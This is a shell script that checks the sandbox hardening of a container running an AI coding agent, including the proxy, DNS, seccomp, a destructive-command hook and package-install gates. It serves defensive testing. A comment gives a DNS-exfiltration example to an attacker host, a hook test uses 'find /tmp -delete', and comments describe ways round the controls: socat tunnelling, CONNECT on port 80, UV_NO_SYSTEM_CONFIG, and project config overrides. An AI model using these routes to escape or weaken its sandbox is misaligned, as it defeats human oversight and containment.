#!/usr/bin/env bash
# =============================================================================
# verify-sandbox.sh — run INSIDE the container to confirm hardening is active
# =============================================================================
# Usage (from host):
#   scripts/profile.sh <p> verify      # or: just verify <p>
# That streams THIS file into the agent over stdin — nothing is copied into
# /workspace, so there is no staged copy to go stale — and runs two host-side
# allowlist-enforcement checks first that cannot live in here (this script runs
# inside the agent, which can see neither the repo nor the proxy container).
#
# Also runnable from a staged copy, which is how the tier-2 audit gets it there:
#   scripts/stage-audit-package.sh <p>
#   scripts/profile.sh <p> exec bash /workspace/temp_audit_package/scripts/verify-sandbox.sh
# =============================================================================
set -uo pipefail

PASS=0; FAIL=0; WARN=0
# Use ++VAR (pre-increment) — ((VAR++)) returns the pre-increment value, so
# when VAR is 0 the command exits 1 and breaks `check && pass || fail` chains.
pass() { printf '\033[0;32m[PASS]\033[0m %s\n' "$*"; ((++PASS)); }
fail() { printf '\033[0;31m[FAIL]\033[0m %s\n' "$*"; ((++FAIL)); }
warn() { printf '\033[1;33m[WARN]\033[0m %s\n' "$*"; ((++WARN)); }

# Non-root
[[ "$(id -u)" -ne 0 ]] && pass "non-root (UID $(id -u))" || fail "running as root"

# Writable rootfs is the current intended baseline (read_only: true broke VS
# Code Dev Containers; non-root + cap_drop: ALL is the boundary). Read mount
# flags from /proc/mounts — `touch /` can't distinguish ro from "/ is
# root-owned 755 and we're non-root", which would false-positive.
ROOT_OPTS=$(awk '$2=="/"{print $4; exit}' /proc/mounts)
case ",$ROOT_OPTS," in
  *,ro,*) warn "rootfs read-only (unexpected — compose changed?)" ;;
  *,rw,*) pass "rootfs writable (intended)" ;;
  *)      warn "rootfs mount flags unparsed: $ROOT_OPTS" ;;
esac

# /tmp writable
if touch /tmp/.t 2>/dev/null; then rm -f /tmp/.t; pass "/tmp writable (tmpfs)"; else fail "/tmp not writable"; fi

# Capabilities — anchor grep so we don't also match CapBnd/CapPrm/CapInh
CAP_EFF=$(grep '^CapEff:' /proc/self/status | awk '{print $2}')
[[ "$CAP_EFF" == "0000000000000000" ]] && pass "caps dropped" || warn "CapEff=$CAP_EFF"

# Seccomp — anchor grep; /proc/self/status also has Seccomp_filters: which
# otherwise pollutes the awk output and breaks the equality check.
SM=$(grep '^Seccomp:' /proc/self/status | awk '{print $2}')
[[ "$SM" == "2" ]] && pass "seccomp mode 2 active" || fail "seccomp not active (mode=$SM)"

# PID limit
PM=$(cat /sys/fs/cgroup/pids.max 2>/dev/null || echo unknown)
[[ "$PM" != "max" && "$PM" != "unknown" ]] && pass "pids.max=$PM" || warn "pids.max=$PM"

# Proxy routing — direct internet should fail, proxied should work
if curl -s --connect-timeout 3 --noproxy '*' https://github.com >/dev/null 2>&1; then
  fail "direct internet reachable (proxy bypassed)"
else
  pass "direct internet blocked"
fi
# api.anthropic.com is the reliable proxy-success probe — it's always on the
# allowlist (autonomous and planning modes both). api.github.com is only
# reachable in planning mode, so it would WARN by design in autonomous mode.
if curl -s --connect-timeout 5 https://api.anthropic.com >/dev/null 2>&1; then
  pass "proxied request to allowed domain works (api.anthropic.com)"
else
  warn "proxied request failed — check allowed_domains.txt / proxy running"
fi
if curl -s --connect-timeout 5 https://example.com >/dev/null 2>&1; then
  fail "disallowed domain (example.com) was reachable"
else
  pass "disallowed domain blocked by proxy"
fi

# DNS exfil tripwire (audit H2): with `internal: true` Docker still forwards
# DNS for any name to the host resolver, so an unconstrained agent could
# `getaddrinfo("base32-secret.attacker.tld")` and exfil via DNS subdomains.
# The fix is `dns: [127.0.0.1]` + extra_hosts in compose. To verify it took:
# resolution of any external name should fail. Use a guaranteed-not-internal
# name; on PASS, getent returns empty / nonzero. Internal names (egress-proxy)
# must still resolve via /etc/hosts.
if getent hosts example.com >/dev/null 2>&1; then
  fail "external DNS resolves (example.com) — DNS exfil channel open; check dns:/extra_hosts in docker-compose.yml"
else
  pass "external DNS does not resolve (DNS exfil blocked)"
fi
if getent hosts egress-proxy >/dev/null 2>&1; then
  pass "internal hostname resolves via /etc/hosts (egress-proxy)"
else
  fail "egress-proxy not resolvable — extra_hosts entry missing or wrong"
fi

# CONNECT-on-non-443 tripwire (audit H1): squid.conf must include
# `http_access deny CONNECT !SSL_ports`. Without it, CONNECT api.anthropic.com:80
# would tunnel raw TCP. Probe via the proxy and expect a 4xx Squid denial.
# Use 80 because it's in Safe_ports (so the test isolates the CONNECT-port
# control, not the Safe_ports filter).
#
# NOTE on the probe shape: an earlier version used
#   curl -x http://egress-proxy:3128 --proxytunnel https://api.anthropic.com:80/
# which surfaces curl's transport error (52 / empty reply) as the literal
# string "000" — same output you'd see if the proxy were truly off, masking
# real H1 regressions. We instead open a raw socket to the proxy, send the
# CONNECT request line, and parse Squid's HTTP response directly. A real H1
# regression would return "HTTP/1.1 200 Connection established"; the deny is
# a "HTTP/1.1 403 Forbidden".
code=$(python3 - <<'PY' 2>/dev/null
import socket
try:
    s = socket.create_connection(("egress-proxy", 3128), timeout=5)
    s.sendall(b"CONNECT api.anthropic.com:80 HTTP/1.1\r\n"
              b"Host: api.anthropic.com:80\r\n\r\n")
    data = s.recv(4096)
    s.close()
    line = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
    parts = line.split()
    # status line: HTTP/1.1 <code> <reason>
    print(parts[1] if len(parts) >= 2 and parts[1].isdigit() else "000")
except Exception:
    print("000")
PY
)
if [[ "$code" == "403" || "$code" == "400" ]]; then
  pass "Squid denies CONNECT on non-443 ports (got HTTP $code)"
elif [[ "$code" == "000" ]]; then
  # 000 is the probe's own sentinel for "no status line came back" — i.e. the
  # proxy was unreachable, not permissive. Reporting that as "Squid ALLOWED
  # CONNECT to port 80" is a false verdict on the loudest possible check, and
  # it fires exactly when the proxy is down, which is when someone is already
  # worried. A probe-infrastructure failure must never read as a policy verdict.
  warn "could not reach the proxy to test CONNECT on port 80 — the port-80 hole was NOT verified (is egress-proxy running?)"
else
  fail "Squid allowed CONNECT to port 80 (HTTP $code) — add 'http_access deny CONNECT !SSL_ports' to squid.conf"
fi

# Deny-destructive hook tripwire (audit L8): sandbox_templates/claude/hooks/deny-destructive.sh
# must be installed root-owned at the path referenced in settings.json's hooks
# block, executable, not writable by the agent, and must actually block the
# canonical bypass (find -delete) — script presence alone is insufficient,
# the behaviour is what closes the matcher gap.
HOOK=/usr/local/lib/claude-hooks/deny-destructive.sh
if [[ ! -x "$HOOK" ]]; then
  fail "deny-destructive hook missing or not executable at $HOOK"
elif [[ -w "$HOOK" ]]; then
  fail "deny-destructive hook is writable by agent (should be root:root 0755): $(stat -c '%U:%G %a' "$HOOK")"
else
  hook_out=$(printf '{"tool_name":"Bash","tool_input":{"command":"find /tmp -delete"}}' | "$HOOK" 2>/dev/null)
  # Tolerate both compact and pretty-printed JSON so the probe doesn't
  # silently fail if the hook's jq output formatting changes.
  if echo "$hook_out" | grep -Eq '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"'; then
    pass "deny-destructive hook blocks find -delete"
  else
    fail "deny-destructive hook present but not blocking find -delete (out: $hook_out)"
  fi
fi

# SUID/SGID inventory (audit M3): the container has a stock-Ubuntu SUID set
# baked in by the base image. Anything outside that set is drift — typically
# a wheel/.deb that snuck a SUID binary into the rootfs. The kernel boundary
# (no_new_privileges + cap_drop:ALL) neutralizes SUID at runtime, but the
# whole point of the tripwire is to surface drift before it's exploited.
# `ssh-agent` and `ssh-keysign` would specifically indicate openssh-client
# regressed, which is itself a finding worth shouting about.
EXPECTED_SUID='chage chfn chsh expiry gpasswd mount newgrp pam_extrausers_chkpwd passwd su umount unix_chkpwd'
ACTUAL_SUID=$(find / -xdev -perm /6000 -type f 2>/dev/null \
              | xargs -r -n1 basename 2>/dev/null \
              | sort -u \
              | tr '\n' ' ' \
              | sed 's/ $//')
EXPECTED_NORMALIZED=$(echo "$EXPECTED_SUID" | tr ' ' '\n' | sort -u | tr '\n' ' ' | sed 's/ $//')
if [[ "$ACTUAL_SUID" == "$EXPECTED_NORMALIZED" ]]; then
  pass "SUID/SGID inventory matches stock Ubuntu set"
else
  fail "SUID/SGID drift: expected '$EXPECTED_NORMALIZED' got '$ACTUAL_SUID'"
fi

# bwrap + socat + ssh are deliberately NOT installed (Claude Code's bwrap
# sandbox can't run here — seccomp correctly blocks unprivileged user
# namespaces — socat was a raw-TCP exfil channel bypassing Squid HTTP
# egress, and openssh-client is the tool surface that would weaponize
# any re-injected SSH_AUTH_SOCK). Absent is correct; presence is drift.
command -v bwrap >/dev/null && fail "bwrap present (should be uninstalled)" || pass "bwrap absent (intended)"
command -v socat >/dev/null && fail "socat present (should be uninstalled)" || pass "socat absent (intended)"
command -v ssh   >/dev/null && fail "ssh present (openssh-client should be purged)" || pass "ssh absent (intended)"

# VS Code Dev Containers leakage — controls we documented after the
# a real profile audit. Each of these maps to a specific finding with a known
# regression risk (host VS Code settings can revert, copyGitConfig can
# get re-enabled, etc.). Keep these tight — they're tripwires, not an
# audit substitute.
[[ -z "${SSH_AUTH_SOCK:-}" ]] && pass "SSH_AUTH_SOCK unset (no agent forwarding)" \
  || fail "SSH_AUTH_SOCK=$SSH_AUTH_SOCK (VS Code SSH agent forwarding — disable remote.SSH.enableAgentForwarding)"
# shellcheck disable=SC2144 -- single-path test, no glob expansion needed
# Socket file alone is cosmetic — VS Code's attach helper creates them and
# `/tmp` tmpfs only clears on `--force-recreate`. The real regression signal
# is the *combination*: socket present AND (env re-injected OR ssh re-added).
# Either mitigation alone makes the inode unusable.
if ls /tmp/vscode-ssh-auth-*.sock >/dev/null 2>&1; then
  if [[ -z "${SSH_AUTH_SOCK:-}" ]] && ! command -v ssh >/dev/null 2>&1; then
    pass "VS Code SSH socket file present but env unset and ssh purged (cosmetic)"
  else
    fail "VS Code SSH auth socket present in /tmp AND mitigation incomplete (SSH_AUTH_SOCK set or ssh installed)"
  fi
else
  pass "no VS Code SSH auth socket in /tmp"
fi
[[ ! -e /home/agent/.gitconfig ]] && pass "no host .gitconfig copied into rootfs" \
  || fail "/home/agent/.gitconfig present (disable dev.containers.copyGitConfig on host)"
# Only flag host-reaching helpers. The benign in-container helper (gh auth
# setup-git writes `!/usr/local/bin/gh auth git-credential`) is expected and
# uses the sandbox's own token. The injections we're watching for are VS Code Dev Containers'
# IPC-backed shim (vscode-server / vscode-remote-containers paths) and macOS
# host helpers (osxkeychain, git-credential-manager) leaked via copyGitConfig.
if [[ -f /home/agent/.config/git/config ]] && \
   grep -qE 'helper\s*=.*(vscode-server|vscode-remote-containers|osxkeychain|git-credential-manager)' \
     /home/agent/.config/git/config; then
  fail "host-reaching credential.helper in .config/git/config (VS Code shim or macOS helper — profile.sh ensure_state should strip it)"
else
  pass "no host-reaching credential.helper in .config/git/config"
fi
# Belt-and-suspenders: the grep above only reads the GIT_CONFIG_GLOBAL file.
# `gitCredentialHelperConfigLocation` can target the *system* layer
# (/etc/gitconfig) instead, and a stray helper can also land in a repo-local
# /workspace/.git/config — neither of which the single-file grep sees. Ask git
# itself to resolve credential.helper across all layers and report the origin,
# so an injection at any layer surfaces. Same allowlist: gh's own
# in-container shim (!/usr/local/bin/gh) is expected and passes; only
# VS Code / host-keychain helpers fail. `|| true` because git exits non-zero
# when no helper is configured at all (the clean case).
helper_origins="$(git config --show-origin --get-all credential.helper 2>/dev/null || true)"
if printf '%s' "$helper_origins" \
     | grep -qE '(vscode-server|vscode-remote-containers|osxkeychain|git-credential-manager)'; then
  fail "host-reaching credential.helper resolved by git across config layers (system/global/local) — check origin: $helper_origins"
else
  pass "no host-reaching credential.helper across git config layers (system/global/local)"
fi
# Any UID-0 process other than PID 1 is drift — VS Code's attach flow
# occasionally leaves orphan `docker exec -u root` shells. Count them
# without counting the probe itself (awk invoked by verify-sandbox runs
# as the agent, not root, so it won't appear).
ROOT_PROCS=$(ps -eo pid,user | awk 'NR>1 && $2=="root" && $1!=1 {n++} END{print n+0}')
[[ "$ROOT_PROCS" -eq 0 ]] && pass "no stray UID-0 processes" \
  || fail "$ROOT_PROCS UID-0 process(es) running besides PID 1 (likely VS Code attach orphan)"

# Claude CLI present
command -v claude >/dev/null && pass "claude CLI present" || fail "claude CLI missing"

# ---------------------------------------------------------------------------
# Gate 2 — dependency-resolution quarantine (slopsquat defence).
# These assert the LIVE values rather than the files, because a config that
# looks correct and does nothing is the failure shape this repo keeps meeting.
#
# macolima posture, which differs from windows-ai-sandbox: the agent is UID 1000
# with cap_drop ALL and no_new_privs, so it CANNOT edit /usr/etc/npmrc (root-owned,
# image layer). It CAN edit ~/.config/pnpm/rc, which is a per-profile bind mount
# it owns. So the npm half is genuinely out of the agent's reach here and the
# pnpm half is defence-in-depth; this tripwire is what makes either drift
# surface within one `up`.
# Purely local: no network call, so it still runs with egress down.
# ---------------------------------------------------------------------------
# UNITS ARE DIFFERENT AND BOTH ARE VERIFIED FROM SOURCE (2026-07-31):
#   npm  min-release-age     = DAYS.    man 7 config: "only versions that were
#                              available more than the given number of days ago".
#   pnpm minimum-release-age = MINUTES. pnpm.cjs:
#                              new Date(Date.now() - minimumReleaseAge * 60 * 1e3)
# So 7 (npm) and 10080 (pnpm) are the SAME 7-day window. Do not "harmonise" them.
NPM_AGE="$(npm config get min-release-age 2>/dev/null || echo '')"
case "$NPM_AGE" in
  ''|null|undefined)
    fail "npm min-release-age unset — freshly-published packages resolve with no quarantine (expected 7 DAYS; see Dockerfile 'Gate 2')" ;;
  *[!0-9]*)
    fail "npm min-release-age='$NPM_AGE' is not a plain integer — the value is a NUMBER OF DAYS, and a suffixed form (7d, 1w) does not parse" ;;
  *)
    if [[ "$NPM_AGE" -ge 1 ]]; then pass "npm min-release-age=$NPM_AGE day(s)"
    else fail "npm min-release-age=$NPM_AGE — quarantine disabled"; fi ;;
esac

# A non-integer here is worse than "off": pnpm computes the cutoff as
# `value * 60 * 1e3`, so a suffixed string ("0s", "7d") yields NaN and
# `new Date(NaN)` = Invalid Date. Every comparison against it is false, so pnpm
# rejects EVERY version and no install can resolve at all. Fails closed and
# looks like a broken registry. Hard FAIL, with the fix in the message.
PNPM_AGE="$(pnpm config get minimumReleaseAge 2>/dev/null || echo '')"
case "$PNPM_AGE" in
  ''|null|undefined)
    fail "pnpm minimum-release-age unset — pnpm resolves with no quarantine (expected 10080 MINUTES; seeded by ensure_state in scripts/profile.sh)" ;;
  *[!0-9]*)
    fail "pnpm minimum-release-age='$PNPM_AGE' is not a plain integer — pnpm computes value*60*1e3, so a suffixed form gives Invalid Date and REJECTS EVERY VERSION (no install can resolve). Use plain minutes, e.g. 10080 for 7 days" ;;
  *)
    if [[ "$PNPM_AGE" -ge 1440 ]]; then pass "pnpm minimum-release-age=$PNPM_AGE min ($((PNPM_AGE/1440)) day(s))"
    elif [[ "$PNPM_AGE" -ge 1 ]]; then fail "pnpm minimum-release-age=$PNPM_AGE MINUTES (<1 day) — looks like days were entered where MINUTES are required (1440 = 24h, 10080 = 7d); quarantine is effectively off"
    else fail "pnpm minimum-release-age=$PNPM_AGE — quarantine disabled"; fi ;;
esac

# G10: a PROJECT .npmrc beats our global /usr/etc/npmrc (precedence is
# cli > env > project > user > global), so any repo under /workspace can switch
# the quarantine off for itself — silently, and without touching anything this
# sandbox owns. Verified 2026-07-31: a project file with min-release-age=0 takes
# `npm config get min-release-age` from 7 to 0.
#
# COMPARE, do not merely report. The first version of this check warned on the
# PRESENCE of any project release-age setting, which made it unactionable: a repo
# doing the right thing (committing a window so it also applies outside this
# sandbox, per plan 04) got the same warning as one switching the gate off, so
# the line became permanent furniture. Warn only when the project value is
# WEAKER than the global; a value that meets or beats it is the wanted state.
#
# Still never FAIL: the workspace is the user's own repo and may have a
# considered reason. This reports; the human decides.
if [[ -d /workspace ]]; then
  # Baselines in MINUTES. Read with the explicit global flags — a plain
  # `npm config get` is CWD-sensitive and a project .npmrc overrides it, so a
  # weak file would end up compared against itself and pass. Verified 2026-08-02:
  # inside a dir with min-release-age=1, `config get` says 1 and
  # `config get --location=global` still says 7.
  # npm counts DAYS, pnpm counts MINUTES (see the block above) — normalise.
  g_npm_d="$(npm config get --location=global min-release-age 2>/dev/null || echo '')"
  g_pnpm_m="$(pnpm config get --global minimum-release-age 2>/dev/null || echo '')"
  if [[ -n "$g_npm_d" && "$g_npm_d" != *[!0-9]* ]]; then g_npm_m=$(( g_npm_d * 1440 )); else g_npm_m=""; fi
  [[ -n "$g_pnpm_m" && "$g_pnpm_m" != *[!0-9]* ]] || g_pnpm_m=""

  fmt_window() {  # minutes -> human-readable window
    if   (( $1 == 0 ));    then printf 'OFF'
    elif (( $1 < 60 ));    then printf '%dmin' "$1"
    elif (( $1 < 1440 ));  then printf '%dh'   "$(( $1 / 60 ))"
    else                        printf '%dd'   "$(( $1 / 1440 ))"; fi
  }

  weaker=""; malformed=""; uncomparable=""; ok_count=0
  # Both file kinds carry the same setting under different spellings and units:
  #   .npmrc              min-release-age=<DAYS> | minimum-release-age=<MINUTES>
  #   pnpm-workspace.yaml minimumReleaseAge: <MINUTES>
  # A pnpm workspace file in a monorepo CHILD is as effective an override as an
  # .npmrc, and was invisible here until 2026-08-03.
  while IFS= read -r rc; do
    case "$rc" in
      *pnpm-workspace.yaml) pat='^[[:space:]]*minimumReleaseAge[[:space:]]*:' ; sep=':' ;;
      *)                    pat='^[[:space:]]*(min-release-age|minimum-release-age)[[:space:]]*=' ; sep='=' ;;
    esac
    while IFS= read -r line; do
      key="${line%%${sep}*}"; key="${key//[[:space:]]/}"
      val="${line#*${sep}}";  val="${val//[[:space:]]/}"
      case "$key" in
        min-release-age)     base="$g_npm_m"
                             if [[ -n "$val" && "$val" != *[!0-9]* ]]; then mins=$(( val * 1440 )); else mins=""; fi ;;
        minimum-release-age|minimumReleaseAge)
                             base="$g_pnpm_m"
                             if [[ -n "$val" && "$val" != *[!0-9]* ]]; then mins="$val"; else mins=""; fi ;;
        *) continue ;;
      esac
      label="${rc#/workspace/} [$key=$val]"
      if   [[ -z "$mins" ]]; then malformed="${malformed}${label}  "
      elif [[ -z "$base" ]]; then uncomparable="${uncomparable}${label}  "
      elif (( mins < base )); then
        weaker="${weaker}${label} = $(fmt_window "$mins") vs global $(fmt_window "$base");  "
      else ok_count=$(( ok_count + 1 ))
      fi
    done < <(grep -hE "$pat" "$rc" 2>/dev/null)
  done < <(find /workspace -maxdepth 4 \( -name .npmrc -o -name pnpm-workspace.yaml \) \
             -not -path '*/node_modules/*' 2>/dev/null)

  # A non-integer is worse than a weak value: pnpm computes value*60*1e3, so a
  # suffixed form yields NaN -> Invalid Date -> every version rejected.
  [[ -n "$malformed" ]] && warn "project config has a NON-INTEGER release-age — pnpm computes value*60*1e3, so this yields Invalid Date and REJECTS EVERY VERSION (presents as a broken registry): $malformed"
  [[ -n "$weaker" ]] && warn "project config WEAKENS the global quarantine (project > global): $weaker"
  [[ -n "$uncomparable" ]] && warn "project config sets a release-age but the global baseline is unreadable, so it cannot be compared: $uncomparable"
  if [[ -z "$malformed$weaker$uncomparable" ]]; then
    if (( ok_count > 0 )); then
      pass "$ok_count project release-age setting(s) under /workspace meet or beat the global quarantine"
    else
      pass "no project .npmrc / pnpm-workspace.yaml overriding the release-age quarantine under /workspace"
    fi
  fi
  unset -f fmt_window
fi

# npm 12 blocks lifecycle scripts by default via the allow-scripts allowlist.
# That is where a slopsquat payload runs, so losing it matters more than the
# age gate. Empty list = nothing may run scripts (the wanted state).
NPM_SCRIPTS="$(npm config get allow-scripts 2>/dev/null || echo '')"
if [[ "$NPM_SCRIPTS" == '[""]' || -z "$NPM_SCRIPTS" ]]; then
  pass "npm install scripts blocked (allow-scripts=${NPM_SCRIPTS:-empty})"
else
  warn "npm allow-scripts=$NPM_SCRIPTS — packages in this list run install scripts"
fi

# extra-index-url is a dependency-confusion vector: pip may prefer whichever
# index offers the higher version. Its ABSENCE is the control.
if [[ -f /etc/pip.conf ]]; then
  if grep -qE '^[[:space:]]*extra-index-url' /etc/pip.conf; then
    fail "/etc/pip.conf sets extra-index-url — dependency-confusion vector; remove it"
  else
    pass "pip index pinned, no extra-index-url"
  fi
else
  warn "/etc/pip.conf absent — pip index not pinned (see Dockerfile 'Gate 2')"
fi

# Gate 3 (Python): wheels only. An sdist runs setup.py at INSTALL time — the
# Python analogue of the npm lifecycle scripts already blocked above. Both tools
# need asserting because they share no configuration: uv reads /etc/uv/uv.toml
# and no pip config at all; pip reads /etc/pip.conf. Checking one would leave the
# other silently open, and uv is the primary installer on this image.
if [[ -f /etc/uv/uv.toml ]]; then
  if grep -qE '^[[:space:]]*no-build[[:space:]]*=[[:space:]]*true' /etc/uv/uv.toml; then
    pass "uv wheels-only (no-build=true) — source builds refused"
  else
    fail "/etc/uv/uv.toml exists but does not set no-build=true — uv will build sdists, running setup.py at install time (Dockerfile 'Gate 3')"
  fi
else
  fail "/etc/uv/uv.toml absent — uv will build source distributions (Dockerfile 'Gate 3'). uv reads NO pip config, so /etc/pip.conf does not cover it"
fi

# BEHAVIOURAL assertion for the same gate, because the file check above can pass
# while the gate is off.
#
# MEASURED 2026-08-03 on uv 0.12.0 in this image: `UV_NO_SYSTEM_CONFIG=1` makes uv
# ignore /etc/uv/uv.toml entirely, and a source build that is otherwise refused
# ("Building source distributions is disabled") installs cleanly. The env var is
# undocumented in `uv help`. It never touches the file, so the grep above still
# reports PASS — the exact shape of failure this repo keeps re-learning: a config
# that looks correct and does nothing.
#
# So: actually try to build a trivial local package and require the refusal.
# ~0.1s, no network (`--offline`), nothing fetched and nothing of the package's
# code executed — the point is that uv REFUSES before any build runs.
#
# Honest about scope: this proves enforcement in THIS environment. The agent
# cannot edit /etc/uv/uv.toml here (non-root), but it can still set UV_* in its
# own environment per command, so no in-container check can prevent that bypass
# — defence-in-depth, not the boundary (see CLAUDE.md's invariants). What it does
# buy is that the gate cannot be silently off for the whole container without
# this saying so.
if command -v uv >/dev/null 2>&1; then
  # /root is unreachable for a UID-1000 agent; use the agent's own home.
  _uvg="${HOME:-/home/agent}/.uv-gate-probe"
  rm -rf "$_uvg"; mkdir -p "$_uvg/pkg/src/gateprobe"
  printf '[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "setuptools.build_meta"\n[project]\nname = "gateprobe"\nversion = "0.0.1"\n' \
    > "$_uvg/pkg/pyproject.toml"
  : > "$_uvg/pkg/src/gateprobe/__init__.py"
  if uv venv "$_uvg/v" >/dev/null 2>&1; then
    _uvout=$(uv pip install --python "$_uvg/v/bin/python" --offline "$_uvg/pkg" 2>&1)
    if printf '%s' "$_uvout" | grep -q 'source distributions is disabled'; then
      pass "uv wheels-only is ENFORCED (a source build was refused, not just configured)"
    elif printf '%s' "$_uvout" | grep -qE '^ \+ gateprobe|Installed 1 package'; then
      fail "uv BUILT a source distribution despite /etc/uv/uv.toml — Gate 3 is not in effect (check UV_NO_SYSTEM_CONFIG / UV_NO_BUILD in the environment: $(env | grep -oE 'UV_[A-Z_]+' | tr '\n' ' '))"
    else
      warn "uv wheels-only could not be confirmed behaviourally (probe output: $(printf '%s' "$_uvout" | tail -1))"
    fi
  else
    warn "uv wheels-only not confirmed behaviourally — could not create a probe venv"
  fi
  rm -rf "$_uvg"
  # A persistent bypass in the container's own environment would make every
  # install in this session unguarded, and unlike a per-command env var it is
  # visible from here.
  if [[ -n "${UV_NO_SYSTEM_CONFIG:-}" ]]; then
    fail "UV_NO_SYSTEM_CONFIG is set in the container environment — uv ignores /etc/uv/uv.toml, so Gate 3's uv half is off for every install in this session"
  fi
fi

if [[ -f /etc/pip.conf ]]; then
  if grep -qE '^[[:space:]]*only-binary[[:space:]]*=[[:space:]]*:all:' /etc/pip.conf; then
    # An exemption is legitimate but must be visible — same discipline as npm's
    # allow-scripts allowlist (depaudit N11: an exemption needs a stated reason).
    pip_exempt=$(grep -E '^[[:space:]]*no-binary[[:space:]]*=' /etc/pip.conf | sed 's/.*=[[:space:]]*//')
    if [[ -n "$pip_exempt" ]]; then
      warn "pip wheels-only, but exempts: $pip_exempt — each exemption builds from source; confirm the reason is recorded"
    else
      pass "pip wheels-only (only-binary=:all:), no exemptions"
    fi
  else
    fail "/etc/pip.conf does not set only-binary=:all: — pip will build sdists (Dockerfile 'Gate 3')"
  fi
fi

# G10p: the PYTHON half of G10, and the reason work/0008 item 1 exists. Gate 2's
# project-level override was defended in three places (here, with-egress.sh's
# scan_workspace_rc, depaudit's N03); Gate 3's was defended in none. The
# asymmetry was accidental, not decided.
#
# What it catches: a repo under /workspace carrying `no-build = false` (uv.toml
# or [tool.uv]) or a pip.conf without `only-binary = :all:`. Either restores
# source builds for that project — an sdist runs setup.py / a PEP-517 backend at
# INSTALL time, which is the Python analogue of the npm lifecycle script this
# image already blocks (ADR-0004). The system-file and behavioural probes above
# say nothing about it: they assert the IMAGE default, and a project override is
# precisely what beats an image default.
#
# WARN, never FAIL — same standing as G10. The workspace is the user's own repo
# and may have a considered reason; this reports, the human decides. Silence on
# a project that declares nothing is the wanted state (the N03 lesson: a check
# that fires on every healthy repo is furniture).
#
gate3_scan_file() {
  python3 - "$1" <<'PY'
import configparser, os, sys, tomllib

path = sys.argv[1]
name = os.path.basename(path)
out = []

def emit(key, val, cls):
    out.append("%s=%s\t%s" % (key, val, cls))

try:
    if name == "pip.conf":
        cp = configparser.ConfigParser(strict=False)
        cp.read(path)
        only_binary = no_binary = None
        for sect in cp.sections():
            if cp.has_option(sect, "only-binary"):
                only_binary = (cp.get(sect, "only-binary") or "").strip()
            if cp.has_option(sect, "no-binary"):
                no_binary = (cp.get(sect, "no-binary") or "").strip()
        # A pip.conf in the tree REPLACES /etc/pip.conf wherever it is in
        # effect (PIP_CONFIG_FILE, a CI step, a tox env) rather than merging
        # with it, so the wheels-only default is simply absent there. pip does
        # not read it from the CWD on its own — which is exactly why this
        # reports and never blocks.
        if only_binary is None:
            emit("only-binary", "<unset>", "OFF")
        elif only_binary == ":all:":
            emit("only-binary", only_binary, "OK")
        else:
            emit("only-binary", only_binary, "WEAKER")
        if no_binary:
            emit("no-binary", no_binary, "WEAKER")
    else:
        with open(path, "rb") as fh:
            data = tomllib.load(fh)
        table = data if name == "uv.toml" else (data.get("tool") or {}).get("uv") or {}
        if not isinstance(table, dict):
            table = {}
        if "no-build" in table:
            v = table["no-build"]
            if v is False:
                emit("no-build", "false", "OFF")
            elif v is True:
                emit("no-build", "true", "OK")
            else:
                emit("no-build", str(v), "UNPARSED")
except (OSError, tomllib.TOMLDecodeError, configparser.Error, UnicodeDecodeError) as e:
    emit("parse", type(e).__name__, "UNPARSED")

for row in out:
    print(row)
PY
}

if [[ -d /workspace ]]; then
  if command -v python3 >/dev/null 2>&1; then
    g3_off=""; g3_weaker=""; g3_unparsed=""; g3_ok=0
    while IFS= read -r g3f; do
      while IFS=$'\t' read -r g3kv g3cls; do
        [[ -n "$g3kv" ]] || continue
        g3label="${g3f#/workspace/} [$g3kv]"
        case "$g3cls" in
          OFF)      g3_off="${g3_off}${g3label}  " ;;
          WEAKER)   g3_weaker="${g3_weaker}${g3label}  " ;;
          UNPARSED) g3_unparsed="${g3_unparsed}${g3label}  " ;;
          *)        g3_ok=$(( g3_ok + 1 )) ;;
        esac
      done < <(gate3_scan_file "$g3f" 2>/dev/null)
    done < <(find /workspace -maxdepth 4 \
               \( -name uv.toml -o -name pyproject.toml -o -name pip.conf \) \
               -not -path '*/node_modules/*' -not -path '*/.venv/*' \
               -not -path '*/.venv-*/*' -not -path '*/site-packages/*' \
               -not -path '*/.git/*' 2>/dev/null)

    [[ -n "$g3_off" ]] && warn "project config OPTS OUT of wheels-only (project > /etc/uv/uv.toml, /etc/pip.conf): $g3_off— installs there build from source, running setup.py at install time (ADR-0004)"
    [[ -n "$g3_weaker" ]] && warn "project config exempts package(s) from wheels-only: $g3_weaker— each exemption builds from source; confirm the reason is recorded"
    [[ -n "$g3_unparsed" ]] && warn "project config could not be parsed, so its wheels-only stance is UNKNOWN (never read an unknown as a pass): $g3_unparsed"
    if [[ -z "$g3_off$g3_weaker$g3_unparsed" ]]; then
      if (( g3_ok > 0 )); then
        pass "$g3_ok project wheels-only setting(s) under /workspace match the image default"
      else
        pass "no project uv.toml / pyproject.toml / pip.conf under /workspace overrides wheels-only"
      fi
    fi
  else
    warn "python3 absent — cannot check /workspace for project-level wheels-only opt-outs (G10p)"
  fi
fi

echo ""
echo "== $PASS passed | $FAIL failed | $WARN warnings =="
[[ $FAIL -eq 0 ]]
